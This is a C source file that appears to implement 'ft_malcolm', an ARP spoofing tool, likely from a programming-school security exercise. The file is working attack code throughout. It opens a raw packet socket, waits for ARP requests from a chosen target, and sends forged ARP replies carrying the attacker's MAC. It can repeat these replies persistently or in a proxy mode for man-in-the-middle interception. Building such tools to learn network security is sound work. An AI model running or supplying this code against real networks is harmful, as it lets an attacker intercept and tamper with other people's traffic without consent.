#include "../headers/malcolm.h"
#include "../headers/options.h"

static int send_back(struct sockaddr_ll src_addr, struct ethernet_hdr *ethernet,
	struct arp_hdr *arp)
{
	int ret;
	socklen_t addr_len = sizeof(struct sockaddr_ll);
	struct arp_packet packet = {0};

	uint8_t tmp_ip[IP_ADDR_LEN] = {0};

	/* Fill the new packet */
	packet.ethernet = *ethernet;
	packet.arp = *arp;
	/* Set the ARP opcode to reply */
	packet.arp.op = ft_htons(ARP_REPLY);

	/* Changing MAC addresses */
	ft_memcpy(packet.ethernet.dmac, packet.ethernet.smac, ETH_ADDR_LEN);
	ft_memcpy(packet.ethernet.smac, g_data.source_mac, ETH_ADDR_LEN);
	ft_memcpy(packet.arp.tha, packet.arp.sha, ETH_ADDR_LEN);
	ft_memcpy(packet.arp.sha, g_data.source_mac, ETH_ADDR_LEN);

	/* Swapping IP addresses */
	ft_memcpy(tmp_ip, packet.arp.sip, IP_ADDR_LEN);
	ft_memcpy(packet.arp.sip, packet.arp.tip, IP_ADDR_LEN);
	ft_memcpy(packet.arp.tip, tmp_ip, IP_ADDR_LEN);

	/* debug_packet(&packet.ethernet, &packet.arp); */

	ret = sendto(g_data.sockfd, &packet, sizeof(struct arp_packet), 0,
		(struct sockaddr *)&src_addr, addr_len);

	if (ret <= 0) {
		fprintf(stderr, "[!] Failed to send arp reply to ");
		print_ip(STDERR_FILENO, packet.arp.tip);
		fprintf(stderr, "\n");
		return -1;
	}

	if (g_data.opt & OPT_VERBOSE) {
		printf("\n[*] Sent %d byte(s) to ", ret);
		print_mac(packet.arp.tha);
		fflush(stdout);
		printf("\n");
	}

	return 0;
}

int filter_out(uint8_t *tip, uint8_t *rip, int len)
{
	int i = 0;
	while (i < len) {
		if (tip[i] != rip[i])
			return 1;
		i++;
	}

	return 0;
}

static int handle_packet(struct sockaddr_ll src_addr, char *buffer)
{
	struct arp_hdr *arp;
	struct ethernet_hdr *ethernet;
	uint16_t type;
	uint16_t opcode;
	struct timespec wait = {g_data.frequency, 0};
	uint64_t i = 0;

	ethernet = (struct ethernet_hdr *)buffer;
	arp = (struct arp_hdr *)(buffer + sizeof(struct ethernet_hdr));

	type = ft_ntohs(ethernet->type);
	opcode = ft_ntohs(arp->op);

	if (g_data.opt & OPT_VERBOSE) {
		dprintf(STDOUT_FILENO, "[*] Received packet from ");
		print_ip(STDOUT_FILENO, arp->sip);
		dprintf(STDOUT_FILENO, " ");
		print_mac(arp->sha);
		fflush(stdout);
		dprintf(STDOUT_FILENO, " expecting ");
		print_ip(STDOUT_FILENO, g_data.target_ip);
		dprintf(STDOUT_FILENO, " ");
		print_mac(g_data.target_mac);
		fflush(stdout);
		dprintf(STDOUT_FILENO, "\n");
		/* debug_packet(ethernet, arp); */
	}

	if (type == ETH_P_ARP && opcode == ARP_REQUEST &&
		!filter_out(g_data.target_ip, arp->sip, IP_ADDR_LEN) &&
		!filter_out(g_data.target_mac, arp->sha, ETH_ADDR_LEN)) {
		if (g_data.opt & OPT_VERBOSE)
			printf("[*] Valid ARP request, starting the spoofing process\n");
		if (g_data.duration) {
			printf("Spoofing the target for %d seconds\n", g_data.duration);
			alarm(g_data.duration);
		}

		while (g_data.loop) {
			if (send_back(src_addr, ethernet, arp) != 0)
				break;
			if (!(g_data.opt & OPT_PERSISTENT) && !(g_data.opt & OPT_PROXY)) {
				printf("Spoofed the target, exiting\n");
				break;
			}
			ft_putchar('\r');
			printf("Spoofing ");
			fflush(stdout);
			ft_putchar(g_data.wait_loop[i % g_data.wait_loop_len]);
			i++;
			if (g_data.opt & OPT_VERBOSE)
				printf("\n[*] Waiting %d seconds\n", g_data.frequency);
			clock_nanosleep(CLOCK_REALTIME, 0, &wait, NULL);
		}
		if (g_data.opt & OPT_VERBOSE)
			printf("[*] Leaving the spoof process\n");
		return 1;
	}
	else if (g_data.opt & OPT_VERBOSE)
		dprintf(STDOUT_FILENO, "[*] Filtering request\n");

	return 0;
}

static void show_resume()
{
	printf("======SUMMARY======\n");

	/* Source IP */
	dprintf(STDOUT_FILENO, "Source ip: ");
	print_ip(STDOUT_FILENO, g_data.source_ip);
	dprintf(STDOUT_FILENO, "\n");
	/* Source MAC */
	printf("Source mac: ");
	print_mac(g_data.source_mac);
	printf("\n");

	/* Target IP */
	dprintf(STDOUT_FILENO, "Target ip: ");
	print_ip(STDOUT_FILENO, g_data.target_ip);
	dprintf(STDOUT_FILENO, "\n");
	/* Target MAC */
	printf("Target mac: ");
	print_mac(g_data.target_mac);
	printf("\n");

	/* Options */
	printf("Mode: %s\n", g_data.opt & OPT_PROXY ? "PROXY":"SPOOFING");
	printf("Persistent: %s\n", g_data.opt & OPT_PERSISTENT ? "YES":"NO");
	printf("Delay: ");
	g_data.opt & OPT_PERSISTENT ? printf("%d second(s)\n",g_data.frequency):printf("NONE\n");
	printf("Duration: ");
	if (g_data.opt & OPT_PERSISTENT)
		g_data.opt & OPT_DURATION ? printf("%d second(s)\n",g_data.duration):printf("UNDEFINED\n");
	else
		printf("NONE (only when persistency is active)\n");
	printf("Interface: %s\n", g_data.opt & OPT_INTERFACE ? g_data.interface:"NONE");
	printf("Numeric mode: %s\n", g_data.opt & OPT_NUMERIC ? "TRUE":"FALSE");
	printf("Verbose: %s\n", g_data.opt & OPT_VERBOSE ? "TRUE":"FALSE");
	printf("===================\n");
}

int ft_malcolm(void)
{
	int len = sizeof(struct ethernet_hdr) + sizeof(struct arp_hdr);
	char buffer[len];
	int ret;
	struct sockaddr_ll src_addr;
	socklen_t addr_len = sizeof(struct sockaddr_ll);

	if (g_data.opt & OPT_VERBOSE)
		show_resume();

	if (g_data.opt & OPT_VERBOSE)
		printf("[*] Creating AF_PACKET socket\n");
	/* Socket creation */
	if ((g_data.sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
		fprintf(stderr, "[!] Failed to create socket\n");
		return 1;
	}

	/* Initializing signal handler */
	if (g_data.opt & OPT_VERBOSE)
		printf("[*] Initializing signals handler\n");
	signal(SIGINT, inthandler);
	signal(SIGALRM, inthandler);

	if (g_data.opt & OPT_PROXY)
		ft_proxy(g_data.source_ip, g_data.target_ip);
	else {
		printf("Sniffing ARP packets, press CTRL+C to exit...\n");
		while (g_data.loop) {
			ret = recvfrom(g_data.sockfd, buffer, len, MSG_DONTWAIT,
				(struct sockaddr *)&src_addr, &addr_len);
			if (ret > 0 && handle_packet(src_addr, buffer))
				break ;
		}
	}

	if (g_data.opt & OPT_VERBOSE)
		printf("[*] Closing sockfd\n");

	close(g_data.sockfd);
	return 0;
}
